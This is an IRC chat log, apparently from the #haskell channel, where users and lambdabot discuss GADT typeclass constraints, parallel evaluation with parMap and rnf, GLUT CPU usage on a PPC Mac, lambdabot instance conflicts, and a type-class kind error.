11:28:13 <mld> Cale: ok, that sound logical... i'll have to fix it some other way,, this show/read stuff is giving me a headache
11:28:13 <Cale> (er, particular instances, but you know what I mean)
11:28:27 <Cale> mld: What monad are you implementing?
11:28:51 <MenTaLguY> I've got a slightly random question: are there any hierarchical state machine libraries out there for Haskell?
11:29:03 <mld> Cale: basically it's just a >>= f = Bind a f to let me sequence stuff
11:29:51 <Cale> mld: Are you using a GADT?
11:29:54 <mld> Cale: yes
11:29:59 <Cale> mld: okay
11:30:05 <MenTaLguY> hm, and Bind expects a (Show a, Read a) as its first argument?
11:30:30 <mld> MenTaLguY: that's what i would like, yes, since my run function is (Show a)
11:30:52 <Cale> mld: So likely you'll want to just avoid any typeclass restrictions on terms, and worry about them later. You could also put restrictions on non-bind terms.
11:31:10 <MenTaLguY> it seems like just having the (Show a) restriction on your run function should be sufficient
11:31:16 <Cale> Inside a GADT, this would mean what it really should mean, which is that a dictionary for the typeclass will be stored with the data.
11:31:32 * EvilTerran squints at that ?djinn result, and tries to work out how it works
11:31:47 <MenTaLguY> if you don't run then a not being Show doesn't really matter
11:31:47 <smg> EvilTerran: what means djinn?
11:31:53 <EvilTerran> ?where djinn
11:31:53 <lambdabot> darcs get http://darcs.augustsson.net/Darcs/Djinn
11:32:08 * Beelsebob ponders why it didn't stick the test for being a Foldr in the pattern match
11:32:09 <Cale> MenTaLguY: Is there a clear description somewhere of what a hierarchical state machine is?
11:32:31 <MenTaLguY> well, they correspond loosely to a subset of UML statecharts
11:32:47 <Cale> I don't really know anything about UML
11:32:49 <EvilTerran> smg, it uses the Curry-Howard isomorphism to use a theorem-prover to construct haskell expressions that match a given type
11:32:51 <MenTaLguY> (wonderful formal description, I know :P)
11:32:55 <mrd> what class of languages do hierarchical state machines decide?
11:33:07 <MenTaLguY> regular
11:33:16 <mrd> then they are equivalent to DFAs?
11:33:27 <smg> EvilTerran: ha okay
11:33:27 <MenTaLguY> yes
11:33:28 <mld> MenTaLguY: if i just have the restriction on my run function I end up with something like this instead "possible fix: add (Show a, Read a) to the existential context for `Bind'.. In a 'do' expression: (r, t') <- run x t"
11:33:28 <mrd> (and NFAs)
11:33:33 <EvilTerran> ?djinn (a,b) -> (Either a b -> c) -> c
11:33:34 <lambdabot> f (a, _) b = b (Left a)
11:33:46 <Cale> I have a simple toy implementation of NFAs I could give you.
11:34:02 <MenTaLguY> mld: well, you will need to qualify with (Show a) up the chain of use as well
11:34:32 <mld> MenTaLguY: i'm not sure i understand you
11:35:18 <MenTaLguY> you'll need to qualify everything that feeds into your run function too
11:35:26 <Cale> mld: It's likely not Bind itself which needs the instance... at least, I don't see how that's likely, but the primitive computations in your monad.
11:35:46 <mld> so it's probably something simpler that i've just overlooked
11:35:58 <Cale> mld: You could qualify those in your GADT and maybe fix the problem... I'd need to see the code to tell.
11:37:37 <MenTaLguY> basically HSMs are just a way to write complex DFAs without worrying about an exponential explosion of states
11:37:38 <Cale> MenTaLguY: Anyway, NFAs and other finite state machines are rather easy to implement when you have really good Set and Map datatypes like we do.
11:37:49 <MenTaLguY> yeah, I've done it plenty of times :)
11:38:01 <MenTaLguY> I was just wondering if anyone had done the work with HSMs specifically
11:42:28 <MenTaLguY> maybe it's best that I do it myself anyhow though
11:42:49 <MenTaLguY> learning experience and all that
11:42:50 * Cale wonders why he can't find any comprehensible description of HSMs. Why do all these descriptions involve UML? Isn't UML a language for modelling the design of programs?
11:43:08 <MenTaLguY> yes, UML is
11:43:25 <mld> Cale: i've isolated my problem, would you be willing to take a look if i put on lisp-paste?
11:43:49 <Cale> Can't I get a description like "A hierarchical state machine M is a 5-tuple,... satisfying... "
11:44:09 <MenTaLguY> there is an academic paper somewhere, let me see if I can find it
11:44:12 <Cale> mld: sure. hpaste would be better ;)
11:44:14 <Cale> @paste
11:44:14 <lambdabot> Haskell pastebin: http://hpaste.org/new
11:44:20 <mld> alright :)
11:45:08 <mld> Cale: http://hpaste.org/6037
11:45:48 <sw17ch> is there a good way to check how parallel a haskell program is when run?
11:46:10 <sw17ch> or, how much time things actually run in parallel?
11:46:36 <Cale> sw17ch: that's a good question. I'm not sure how the profiling tools reflect that at all.
11:46:55 <Cale> sw17ch: You can watch your CPU meters, but that's not very precise.
11:46:57 <sw17ch> Cale: i finally got my problem figured out, but i'm not getting the results i expected at all
11:47:05 <MenTaLguY> Cale: part of the problem is that HSM stuff seems to be dominated by UML statecharts-related things these days, and the UML people are very bad about formalisms
11:47:05 <sw17ch> oh wait, just a second...
11:47:46 <MenTaLguY> well, tend to be.  there are exceptions.
11:48:14 <sw17ch> Cale: i can definitely tell that its running in parallel... but it's slower than my normal one by 20% :(
11:48:22 <sw17ch> i'm not sure if it's because i'm reading out of the disk... or what
11:49:09 <Cale> sw17ch: It could also be scheduling overheads, if you're parallelising computations which are too small.
11:49:46 <sw17ch> Cale: i don't *think* that's the case (1MB at a time for 11)
11:49:55 <sw17ch> that was my problem originally
11:50:06 <sw17ch> where i was using 64 bytes :P
11:50:17 <Cale> mld: Okay, can you give me a couple examples of operations in your GADT which need those Read and Show contexts?
11:50:48 <Cale> mld: The idea will basically be to remove that context from the run function and move it into constructors for various bits of your datatype, I think.
11:51:12 <sw17ch> after a parMap using rwhnf, how far have things been evaluated... i don't quite understand that part
11:51:42 <Cale> Each element of the list will have been evaluated up to determining the top-level data constructor.
11:51:48 <Cale> Those will happen in parallel.
11:52:06 <Baughn> "As little as possible", to speak vaguely
11:52:31 <sw17ch> so, it's not actually all that parallel?
11:53:08 <Baughn> Depends. If one of the terms you're forcing is something like "sum of the results", a single number, then forcing that might require a lot of computation
11:53:17 <Baughn> sw17ch: On the other hand, you might want rnf instead
11:53:48 <sw17ch> i'm guessing the easiest way to check this is to just drop rnf in quick and test it
11:54:21 <Baughn> sw17ch: So long as you understand what head normal form is
11:54:34 <sw17ch> but apparently, they aren't interchangeable :)
11:54:39 <Cale> sw17ch: Remember that lazy evaluation proceeds outermost first. rwhnf applied to an expression will evaluate until the top-level thing in the expression is a constructor
11:55:50 <sw17ch> so, once it's done, what's left to compute?
11:55:54 <Cale> rnf will keep reducing until it's constructors all the way down, but it requires a typeclass instance in order to tell how to do that.
11:56:06 <sw17ch> hmmm...
11:56:32 <Cale> sw17ch: Well, for example, if  primes is some computation for producing the list of all primes, rwhnf will evaluate up to determining that the list is nonempty
11:56:40 <mld> Cale: you were right, i did just that and, for my stripped down version it seems to work just fine.. thank you
11:56:42 <Cale> It might not even get the first prime of the list.
11:56:56 <Cale> (though it probably will)
11:57:10 <mld> Cale: i'm not sure i understand why it wouldn't work before though
11:57:41 <Baughn> sw17ch: If you say something like "rwnf (sum list)", you'll force everything that is needed to compute that sum - can be useful, but it's probably a waste if you don't actually /need/ the sum
11:57:45 <smg> > let f = enumFrom
11:57:45 <lambdabot>  Parse error at end of input
11:57:47 <Cale> mld: Well, in order to apply run to x, you need to know that x has Read and Show instances.
11:57:57 <Cale> mld: However, what's the type of x?
11:58:13 <sw17ch> Baughn, what do you mean... don't need the sum?
11:58:18 <sw17ch> as in, you'd never use the final sum?
11:58:22 <Cale> mld: It's just some M t, for some type t which might not have such instances.
11:58:27 <Deewiant> > let f = enumFrom in take 10 (f 1)
11:58:28 <lambdabot>  [1,2,3,4,5,6,7,8,9,10]
11:58:35 <Baughn> sw17ch: Right. The list will be forced, but there will also be a redundant lot of addition.
11:59:02 <Baughn> sw17ch: Ideally, you want to force only values you're actually going to use. rnf can help with that, since you decide what to force in the rnf instances
11:59:09 <Baughn> *NFData instances
11:59:10 <sw17ch> Baughn, i guess i oversimplified the parallelism problem in haskell
11:59:19 <Cale> sw17ch: rnf primes, on the other hand, will spin forever, computing primes for as long as you don't run out of memory.
11:59:49 <sw17ch> Cale: ah, i see
12:00:00 <mld> Cale: yeah, that's true! i'm not used to thinking in types yet i guess :)
12:00:11 <sw17ch> so, using rwhnf will, in fact, still do the computations in parallel, but it doesn't do them all right away
12:00:19 <Baughn> sw17ch: It's still a lot easier than other languages, but parallelism does collide head-on with laziness
12:00:51 <Baughn> sw17ch: If you /want/ it strict, that's easy. Totally lazy would mean not computing anything at all, though; if you want laziness, you must specify /how much/
12:01:02 <SamB> however, laziness is exactly what was needed to keep Haskell in the position where it is a lot easier...
12:01:10 <Cale> sw17ch: It does a little bit of computation on each element of the list, in parallel.
12:01:25 <Cale> sw17ch: But it doesn't necessarily finish the work.
12:02:20 <sw17ch> in this case... i have n Lazy ByteStrings and i have a function that needs to run over each block (i could just concatinate the bytestrings and run the function across once)
12:02:27 <Cale> sw17ch: If f is something nonrecursive, then it will finish the application of f, but maybe not all the stuff which f uses. If f is recursive, and returns a constructor with calls to f in some other parts of the data, then it won't finish those, you'll have data with embedded calls to f in it.
12:02:34 <sw17ch> each ByteString (for now) is of maximum length 1024 * 1024 bytes
12:02:58 <sw17ch> so the embedded calls will not be computed in parallel
12:03:21 <Cale> Not unless you explicitly do some more parList stuff.
12:03:40 <sw17ch> mmm
12:03:57 <Baughn> sw17ch: If you need different strategies at different times for the same structure, one way would be to thread (), or an appropriate strategy function, through the computation in much the same way the IO monad works, forcing rwnh to evaluate everything you're trying to evaluate in order to get the final value, without actually doing (much) computation to get that value
12:04:15 <smg> @src putStr
12:04:15 <lambdabot> putStr s  = hPutStr stdout s
12:04:16 <Baughn> sw17ch: But usually, when you compute something in parallel, you can do it more easily than /that/. :P
12:04:26 <smg> @source hPutStr
12:04:26 <lambdabot> hPutStr not available
12:04:30 <sw17ch> hehe
12:04:41 <oerjan> @src hPutStr
12:04:41 <lambdabot> Source not found.
12:04:58 <smg> hehe
12:05:06 <oerjan> probably pretty primitive
12:05:17 <EvilTerran> mapM_ hPutChar?
12:05:22 <EvilTerran> ish
12:05:30 <EvilTerran> ?type hPutChar
12:05:32 <lambdabot> Not in scope: `hPutChar'
12:05:32 <smg> putStr likely putStr x = sequence_ (map putChar x)
12:05:36 <hpaste>  sw17ch pasted "My Parallel Problem" at http://hpaste.org/6038
12:05:46 <sw17ch> there's my program if you're at all curious to see how bad i've made this :)
12:05:53 <EvilTerran> smg, sequence_ (map f x) = mapM_ f x
12:06:03 <smg> i take note EvilTerran :]
12:06:10 <EvilTerran> = forM_ x f
12:06:31 <shepheb> can I force ghci to re-interpret everything instead of using compiled libraries?
12:06:31 <oerjan> http://www.haskell.org/ghc/docs/latest/html/libraries/base/src/GHC-IO.html#hPutStr
12:06:31 <smg> now you can explain what the _ (underscore) stands for?
12:06:33 <shepheb> (assuming I have the source)
12:06:33 <lambdabot> Title: Haskell Code by HsColour, http://tinyurl.com/2vwfwr
12:06:39 <Baughn> sw17ch: Did switching to rnf help?
12:06:40 <smg> _ = () ?
12:06:44 <Deewiant> smg: ignore the result, i.e. produce IO () instead of IO [a]
12:06:52 <smg> ah okay makes sense
12:06:58 <sw17ch> Baughn, i didn't have the correct stuff implemented to allow it to work...
12:07:10 <smg> @src sequence
12:07:10 <lambdabot> sequence []     = return []
12:07:10 <lambdabot> sequence (x:xs) = do v <- x; vs <- sequence xs; return (v:vs)
12:07:10 <lambdabot> --OR
12:07:10 <lambdabot> sequence xs = foldr (liftM2 (:)) (return []) xs
12:07:11 <smg> @src sequence_
12:07:12 <lambdabot> sequence_ ms = foldr (>>) (return ()) ms
12:07:23 <sw17ch> genomeParsePar.hs:53:39:
12:07:23 <sw17ch>     No instance for (NFData (IO BaseTally))
12:07:23 <sw17ch>       arising from a use of `rnf' at genomeParsePar.hs:53:39-41
12:07:23 <sw17ch>     Possible fix:
12:07:23 <sw17ch>       add an instance declaration for (NFData (IO BaseTally))
12:07:24 <sw17ch>     In the first argument of `parMap', namely `rnf'
12:07:26 <sw17ch>     In the expression: parMap rnf countBases handles
12:07:28 <sw17ch>     In the definition of `parallelCount':
12:07:30 <sw17ch>         parallelCount handles = parMap rnf countBases handles
12:07:34 <smg> sw17ch: oh no! nopaste!
12:07:46 <Baughn> sw17ch: Also, Oh no! IO!
12:08:01 <sw17ch> sorry, and :(
12:08:59 <smg> btw
12:09:07 <smg> if you look at the source of sequence_
12:09:10 <smg> @src sequence_
12:09:10 <lambdabot> sequence_ ms = foldr (>>) (return ()) ms
12:09:17 <smg> you couldn't use foldl am i right?
12:09:39 <Baughn> sw17ch: "mapM rnf $ countBases handles"? Or something like that?
12:09:57 <EvilTerran> smg, you *could*, but it wouldn't work on infinite lists
12:11:06 <Baughn> sw17ch: That's not right, though..
12:11:15 <EvilTerran> ?type foldl (>>) (return ())
12:11:18 <lambdabot> forall (m :: * -> *). (Monad m) => [m ()] -> m ()
12:11:22 <smg> EvilTerran: ah okay
12:11:39 <smg> let mysequence_ actions = foldl (>>) (return ())
12:11:45 <Baughn> sw17ch: Right now, you're mixing IO with parallelism. Try separating them. There's probably an easy, combinator-ish way, but..
12:11:48 <EvilTerran> ?type foldM -- this may also be relevant to your interests
12:11:49 <lambdabot> forall a b (m :: * -> *). (Monad m) => (a -> b -> m a) -> a -> [b] -> m a
12:11:58 <EvilTerran> ?src foldM -- this one *is* a foldl
12:11:58 <lambdabot> Source not found. Where did you learn to type?
12:12:06 <smg> mysequence_ [putChar 'c', putChar 'A'] results into ->     Probable fix: add a type signature that fixes these type variable(s)
12:12:47 <Baughn> sw17ch: If you /did/ make it run in parallel, as it is now, you'd also do the /IO/ in parallel. Apart from the fundamental unhealthiness of such a thing, you'd trash the disk.
12:13:00 <oerjan> :t foldl (>>) (return ()) [putChar 'c', putChar 'A']
12:13:01 <lambdabot> IO ()
12:13:14 <smg> yeah
12:13:16 <sw17ch> Baughn, right now, i actually have the whole file cached and/or in a ramdisk
12:13:21 <EvilTerran> http://haskell.org/ghc/docs/latest/html/libraries/base/src/Control-Monad.html#foldM
12:13:22 <lambdabot> http://tinyurl.com/2c5ecq
12:13:23 <sw17ch> this is more... academic than useful
12:13:31 <oerjan> smg: you are missing actions at the right side
12:13:53 <smg> okay, and what to do then?
12:13:54 <sw17ch> it's along the lines of "how would i do this on a file of incredible size in parallel... can i?"
12:14:16 <smg> ah okay
12:14:22 <Baughn> sw17ch: Well, there is forkIO, but that's concurrency, not pure parallelism
12:14:44 <Baughn> sw17ch: I would suggest reading your data in /serially/ while sparking parallel computation. So, separate them.
12:14:45 <smg> > (\x -> foldl (>>) (return ()) x) [putChar 'c', putChar 'A', putChar '\n']
12:14:45 <lambdabot>  <IO ()>
12:14:49 <smg> k
12:15:46 <Baughn> sw17ch:If you insist, though, look at Control.Concurrent.mergeIO
12:15:53 <ddarius> How goes the book CosmicRay?
12:16:03 <sw17ch> Baughn, i had started that way, but wanted to avoid reading in the whole file all at once and i felt as if i was forced in that direction using parMap
12:16:18 <sw17ch> i'd much rather read a little, spin off a thread, read some more, spin off a thread, and so on
12:16:22 <CosmicRay> ddarius: pretty good, we're coming along nicely
12:16:34 <Baughn> sw17ch: You can do that with forkIO and explicit communication, sure enough
12:16:42 <sw17ch> I know how i'd do this in C just fine... :) i was hoping there's a prettier way i can do it to show off to some biology professors
12:16:45 <sw17ch> and/or any one
12:16:54 * EvilTerran ponders a combination of minimalist parallelism and knot-tying
12:17:07 <Baughn> sw17ch: There's another way
12:17:46 <Baughn> sw17ch: You can have your one thread read data serially. Then spark N parallel computations on the data, then have the N+1th depend (using `seq`, perhaps) on the result of the first N, and so on
12:17:59 <smg> btw hPutChar and hSetBuffering the "h" stands for "haskell"?
12:18:04 <sarehu> handle
12:18:10 <smg> ffs i'm stupid thanks
12:18:27 <Baughn> sw17ch: That way there will only be N computations running at once, and you would of course only read the data for the N+1th after the first N complete. All without any explicit communication.
12:18:56 <sw17ch> Baughn, alright. i'll give that a shot next :) though i'm afraid i'm not yet sure how to do things of that nature using Haskell... thanks for your help.
12:19:19 <Baughn> sw17ch: (Of course, the first thread (running seq) will be working on all the other data in parallel, too. I'm not sure how that'd behave.)
12:19:28 <Samburger> Is Haskell the only functional language using monads?
12:19:35 <Baughn> sw17ch: Neither am I. I'd probably use concurrency. :P
12:20:21 <ddarius> Samburger: Monads can and have been readily implemented in any language with higher order functions (and some without)
12:20:58 <Baughn> sw17ch: http://paste.lisp.org/display/56413 <-- I can at least give you an example of using explicit worker threads
12:21:18 <Samburger> for IO I mean
12:22:06 <ddarius> Samburger: There is no other language that -requires- monads to perform IO, but again, you could easily use monads for IO in other languages as well.  In particular, Clean.
12:22:27 <ddarius> (i.e. you can write a monadic interface to the provided IO routines)
12:22:54 <Baughn> Are there any other purely lazy languages around? What do they use, then?
12:23:11 <ddarius> Baughn: Clean.  It uses uniqueness types.
12:23:45 <Baughn> ddarius: Right, those.. handy, but I think I prefer monads
12:24:15 <ddarius> Baughn: They are orthogonal for the most part.  Adding linear/relevant/affine types to Haskell is probably a good idea.
12:24:44 <Baughn> ddarius: It'd help with things such as arrays, I suppose
12:26:09 <ddarius> Baughn: There are -many- application of linear types.
12:26:37 <dbpatterson> what does hpaste use to syntax color code?
12:28:04 <syntaxfree> I need opinions on the title of my new book. Please refer to #haskell-blah
12:28:43 <ddarius> You have an old book?
12:29:44 <Baughn> ddarius: I have no doubt there are. I'd be worried about the sanity of the implementors, but so long as I'm not one of them I'll simply assume they know what they're doing.
12:30:11 <Saizan> dbpatterson: HsColour
12:31:14 <dbpatterson> Saizan: url? (google is not being very helpful..)
12:31:40 <dbpatterson> oh, got it
12:32:12 <dbpatterson> nevermind, the url in the README file is invalid...
12:32:30 <dbpatterson> and searching on hackage gives me nothing
12:33:27 <dbpatterson> Saizan: errm, nevermind - british spelling of colo(u)r
12:40:36 <Saizan> dbpatterson: i spelled it like that for a reason :)
12:42:18 <Cale> Samburger: Haskell's the only language I know which uses an IO monad.
12:43:03 <Cale> Samburger: However, I think it would be really cool to have something like a scheme using a combinator library (possibly even a monadic one) for IO.
12:43:42 <dbpatterson> another question - html as created by the XHtml combinators, can it be parsed by something like HaXML? or can it be parsed at all? basically, I want to be able to pull out a specific section (in this case, what is between '<code>' tags), change it, and then re-insert it.
12:43:45 <oerjan> don't any of the dependent types languages do it?
12:44:19 <oerjan> maybe they're not big on IO...
12:44:47 <Cale> Actually, that's a good point, I'm not entirely sure what they use.
12:47:55 <Saizan> clean is lazy?
12:48:07 <Cale> Tim Sheard's Omega uses an IO monad, but it's a language pretty closely related to Haskell.
12:48:08 <Cale> Saizan: yes
12:48:19 <BMeph> Saizan: Shouldn't you have said "you spellt is that way..." ;)
12:48:40 <Saizan> BMeph: heh, sorry :)
12:49:38 <BMeph> dbpatterson: Have you checked out HXT?
12:50:54 <dbpatterson> BMeph: I hadnt yet, that looks pretty good.
12:50:56 <dbpatterson> thanks
12:50:57 <lekro> is it normal that a program with HOpenGL/GLUT has 100% CPU all the time even when it is not doing anything, like the example GLUT/redbook/Cube.hs?
12:51:12 <lekro> ( http://darcs.haskell.org/packages/GLUT/examples/RedBook/Cube.hs )
12:51:25 <johnnowak> lekro: it's probably drawing it as quickly as it can
12:51:38 <BMeph> dbpatterson: Sure. You can likely do it in the others, but I know HXT shows you how to do exactly that, right from the start.
12:51:39 <lekro> johnnowak: no, it's not.
12:51:56 <lekro> johnnowak: I tested this with a mouse callback that changes the position of the vertices
12:52:16 <lekro> it does not redraw unless I call explicitly display or postRedisplay or something similar
12:52:49 <Cale> lekro: That doesn't use 100% cpu on my machine
12:53:02 <lekro> Cale: what are you using?
12:53:19 <Cale> I'm running Ubuntu, and ghci-6.8.2
12:53:36 <Cale> It's sitting pretty safely at 0% cpu.
12:53:48 <lekro> GLUT works with ghci?
12:53:52 <Cale> yeah
12:54:14 <Cale> I'll try compiling it.
12:54:16 <siti> same with me ubuntu/nvidia ...
12:54:25 <siti> (0% cpu)
12:54:30 <Cale> yeah, nvidia, should have mentioned
12:54:39 <Cale> Compiled it's the same.
12:55:18 <lekro> GLUT doesn't work with ghci for me
12:55:23 <lekro> neither 6.6.1 nor 6.8.2
12:55:33 <Cale> odd
12:55:43 <Cale> Does it say anything?
12:55:43 <lekro> it only opens a white window without any borders and then freezes
12:55:51 <Cale> huh
12:55:59 <lekro> it successfully loads all opengl/glut libraries
12:56:23 <lekro> and when I compile it with 6.8.2 or 6.6.1 I get 100% CPU
12:57:11 <Cale> What platform?
12:57:18 <lekro> Mac OS X 10.4 (ppc)
12:57:38 <Cale> I think those can all safely be considered bugs.
12:57:56 <Cale> I've heard of people on Mac OS X having trouble running things like Frag as well.
13:08:17 <dabblego> ?check \f -> f "x" == "x" -- why can't lambdabot generate functions?
13:08:17 <lambdabot>        instance (Typeable a, Typeable b) => Show (a -> b)         -- Defined ...
13:08:52 <RayNbow> anyone here familiar with compiling GHC libs? :p
13:09:05 <RayNbow> http://kayalang.org/download/compiling/windows/readline --> "5. Run make stage1 and find something else to do for a few hours."
13:09:06 <lambdabot> Title: Kaya: Haskell Readline library on Windows
13:09:21 * RayNbow is currently listening to his computer making a lot of noise :p
13:09:31 <RayNbow> (and becoming hot :p)
13:10:08 <oerjan> :t Test.QuickCheck.test $ \f -> f "x" == "x"
13:10:10 <lambdabot>     Overlapping instances for Show ([Char] -> [Char])
13:10:10 <lambdabot>       arising from a use of `test' at <interactive>:1:0-19
13:10:10 <lambdabot>     Matching instances:
13:11:08 <oerjan> dabblego: hm it may be that the Show instances for functions in quickcheck and lambdabot conflict
13:13:03 <oerjan> is this something that happened recently?  Cale changed how L.hs works the other day i think
13:13:24 <Cale> hmm...
13:13:33 <Cale> It might be my fault, yeah
13:13:36 <Cale> hmm
13:14:27 <lekro> Cale: true, Frag crashes when I try to start it on the PPC Mac (compiled with ghc-6.8.2)
13:14:38 <BMeph> Has anyone suggested a name for the "flip bind" operator?
13:14:43 <Cale> =<<
13:14:47 <Cale> :t (=<<)
13:14:49 <lambdabot> forall a (m :: * -> *) b. (Monad m) => (a -> m b) -> m a -> m b
13:15:08 <dabblego> oerjan, it wasn't working yesterday either
13:15:27 <oerjan> the longer error message from privmsging lambdabot seems consistent with that
13:15:40 <Saizan> > fail "foo" :: Either String ()
13:15:40 <lambdabot>        add an instance declaration for (Monad (Either String))
13:15:41 <lambdabot>     In the exp...
13:15:56 <Saizan> Cale: it also lacks Control.Monad.Error
13:16:11 <Cale> okay
13:16:14 <oerjan> > tell "hi"
13:16:14 <lambdabot>        add an instance declaration for (MonadWriter [Char] m)
13:16:18 <Baughn> @instances Monad
13:16:19 <lambdabot> ((->) r), ArrowMonad a, Cont r, ContT r m, Either e, ErrorT e m, IO, Maybe, RWS r w s, RWST r w s m, Reader r, ReaderT r m, ST s, State s, StateT s m, Writer w, WriterT w m, []
13:17:19 <BMeph> Fine - has anyone suggested a -PRONOUNCEABLE-  name for the "flip bind" operator? ;p
13:17:49 <oerjan> "dnib" is perfectly pronounceable ;)
13:17:56 <Cale> I wonder where the other instance of Show for functions is coming from.
13:18:05 <Cale> > (*2)
13:18:06 <lambdabot>        instance (Typeable a, Typeable b) => Show (a -> b)
13:18:06 <lambdabot>         -- Defined ...
13:18:10 <Cale> ...
13:18:17 <Cale> > (*2) :: Integer -> Integer
13:18:17 <lambdabot>        instance (Typeable a, Typeable b) => Show (a -> b)
13:18:18 <lambdabot>         -- Defined ...
13:18:23 <Cale> damn
13:18:23 <gnuvince_> :t (<<=)
13:18:25 <lambdabot> Not in scope: `<<='
13:18:30 <gnuvince_> :t (=<<)
13:18:31 <oerjan> lambdabot>        instance (Typeable a, Typeable b) => Show (a -> b) -- Defined in ShowFun,       instance (Serial a, Show a, Show b) => Show (a -> b),         -- Defined in SmallCheck,     In the
13:18:32 <lambdabot> forall a (m :: * -> *) b. (Monad m) => (a -> m b) -> m a -> m b
13:19:03 <Cale> ah
13:19:08 <Cale> okay
13:19:10 <Cale> hmm
13:19:23 <Cale> I wonder what I could do about that.
13:19:29 <jfredett> BMeph: flip bind? :P
13:19:54 <BMeph> jfredett: "The symbol known as =<<" ;)
13:20:04 <jfredett> no, thats the name
13:20:07 <Cale> I suppose I could avoid importing SmallCheck generally.
13:20:14 <jfredett> the name of =<< == "flip bind"
13:20:15 <jfredett> :P
13:20:35 <oerjan> Cale: lambdabot gives longer messages if you /msg it privately
13:20:43 <Cale> oerjan: ah, right
13:21:24 <awesame> this is pretty impressive: http://github.com/aanand/ruby-do-notation/tree/master
13:21:25 <BMeph> jredett: Well, (=<<) is the symbol, and _flip bind_ (or rather, _flip (>>=)_ ) is the definition. I think it ought to have a _name_, though.
13:21:25 <lambdabot> Title: aanand's ruby-do-notation at master &mdash; GitHub
13:21:38 <awesame> do-notation in ruby, complete with both "do" and "<-"
13:21:47 <jfredett> BMeph: yes, and a perfectly reasonable name is "flip bind"
13:21:51 <jfredett> it's descriptive
13:21:54 <jfredett> it's short
13:21:57 <jfredett> its fun to say
13:21:58 <jfredett> :)
13:22:03 <jfredett> "flipbind"
13:22:16 <oerjan> @yow
13:22:17 <lambdabot> FOOLED you!  Absorb EGO SHATTERING impulse rays, polyester poltroon!!
13:23:28 <oerjan> > (*2)
13:23:31 <dabblego> ?type \t -> Left "x" >>= t
13:23:36 <lambdabot>        instance (SmallCheck.Serial a, Show a, Show b) => Show (a -> b)
13:23:42 <lambdabot>     No instance for (Monad (Either [Char]))
13:23:52 <lambdabot> Plugin `type' failed with: thread killed
13:23:56 <jfredett> BMeph: you think to much, go write C or C++ for half an hour, too much haskell is making you think to hard.
13:24:52 <BMeph> jredett: Hey, I thought we were having a civil discourse here. There's no need to get nasty... ;p
13:24:59 <jfredett> lol, i'm sorry
13:25:08 <jfredett> I wasn't trying to be nasty, i'm just saying... :P
13:25:38 <jfredett> flipbind is a wonderful name for =<<
13:26:40 <lekro> oh, hehe. There is a checkbox saying "debug mode" in the GLUT preferences. after unchecking that I also get 0% CPU.
13:28:33 <jfredett> meh, maybe I'm irritable from all this python code I've been swimming in.
13:29:14 <oerjan> swimming with python is not generally advised.
13:29:38 <jfredett> yeh.
13:30:19 <ddarius> BMeph: It's often called "extend" though then a different notation is used: f^* for (f=<<)
13:31:26 <talentless> can anyone point me to an explanation as to why empty causes a type problem in the following definition:
13:31:26 <talentless> class C t where
13:31:26 <talentless>     empty :: t a
13:31:26 <talentless> newtype T a = Tc [(Int, Tree a)]
13:31:26 <talentless> instance C T where
13:31:27 <talentless>     empty = Tc []
13:31:51 <BMeph> ddarius: Hmm, really? Interesting - where is that notation used, then? :)
13:31:52 <Cale> > (*2)
13:31:54 <lambdabot>  <Integer -> Integer>
13:32:02 <Cale> okay, so that one's fixed...
13:32:25 <jfredett> talentless: try replacing C T w/ C (T a) ...
13:32:31 <ddarius> BMeph: In several CS papers using category theory, e.g. Moggi's Notions of Computation and Monads
13:32:33 <jfredett> in the instance def
13:32:45 <Cale> > throwError "foo" :: Either String ()
13:32:45 <lambdabot>  Left "foo"
13:32:50 <Cale> and so is that one :)
13:32:50 <ddarius> :t \f -> (f,(f=<<))
13:32:52 <lambdabot> forall a (m :: * -> *) b. (Monad m) => (a -> m b) -> (a -> m b, m a -> m b)
13:33:08 <Cale> (I refuse to use fail explicitly)
13:33:35 <oerjan> @check \f -> f "x" == "x"
13:33:35 <lambdabot>  Falsifiable, after 0 tests: <[Char] -> [Char]>
13:33:37 <talentless> jfredett: if i use C (T a) in instance def i get a kind error
13:33:43 <jfredett> hmm
13:33:48 <dabblego> ?check \f xs -> length (map f xs) == length xs
13:33:49 <lambdabot>  Add a type signature
13:33:50 <jfredett> ?hpaste
13:33:50 <lambdabot> Haskell pastebin: http://hpaste.org/new
13:33:57 <dabblego> ?check \f xs -> length (map (f :: Int -> Int) xs) == length xs
13:33:58 <lambdabot>  OK, passed 500 tests.
13:33:59 <jfredett> put it up there, so I can copy it
13:34:02 <litb> hello all
13:34:04 <jfredett> if you dont mind
13:34:04 <dabblego> yay! thanks
13:34:16 <litb> is there something like "a, b = b, a" like in python for haskell too?
13:34:21 <BMeph> Cale: Good show (heh-heh), and congratulations! :)
13:34:33 <ddarius> talentless: What error are you getting.
13:34:47 <jfredett> litb:  "a, b = b, a" swaps assignments, right?
13:35:00 <Riastradh> litb: let (a', b') = (b, a) in ...
13:35:00 <hpaste>  talentless pasted "Kind Error" at http://hpaste.org/6040
13:35:08 <BMeph> ddarius: Moggi, huh? Okay, I guess I'll get me some good CT texts and work my way into it. Thanks again. :)
13:35:27 <Cale> BMeph: It's a lot easier to fix imports now.
13:35:36 <jfredett> if so, you'll probably never need it, but you could probably do (a', b') = (b,a)
13:35:37 <ddarius> talentless: C T is closer to right.  But I want the error not the program.
13:35:41 <BMeph> litb: Guten Abend! :)
13:35:46 <jfredett> there is no variable assingment.
13:36:17 <talentless> ddarius: before changing C T to C (T a) i was getting     Ambiguous type variable `t' in the constraint: `C t' arising from use of `empty' at <interactive>:1:0-4    Probable fix: add a type signature that fixes these type variable(s)
13:36:23 <litb> BMeph: guten abend
13:36:26 <Riastradh> litb, but why you would want to do this is beyond me.  Perhaps you had some ulterior motive.
13:37:10 <litb> oh i see. you cannot mutate variables. already forgot it
13:37:13 <ddarius> talentless: You need to give the use of empty a type annotation or use it in a context where the type is fixed.  How is it supposed to know which instance of C you want.
13:37:36 <BMeph> Cale: Is that from a specific re-write of lambdabot, or just from the re-write to the plugin module?
13:38:02 <oerjan> :t modify (snd &&& fst) -- litb :)
13:38:03 <lambdabot> forall b (m :: * -> *). (MonadState (b, b) m) => m ()
13:38:17 <ddarius> talentless: And note what I said is exactly what the error message suggested.
13:38:35 <BMeph> litb: In the Control.Arrow module, it's called "swap," although it's so easy to whip up, that no one's in a hurry to make it a top-level declaration.
13:39:10 <jfredett> talentless: it works for me
13:39:19 <Cale> BMeph: neither actually. I just restarted it habitually, it turns out I didn't need to.
13:39:22 <jfredett> hmm
13:39:26 <jfredett> i'll paste what I did
13:39:43 <talentless> ddarius: thanks sorry for the silliness.
13:39:43 <talentless> jfredett: thanks as well.
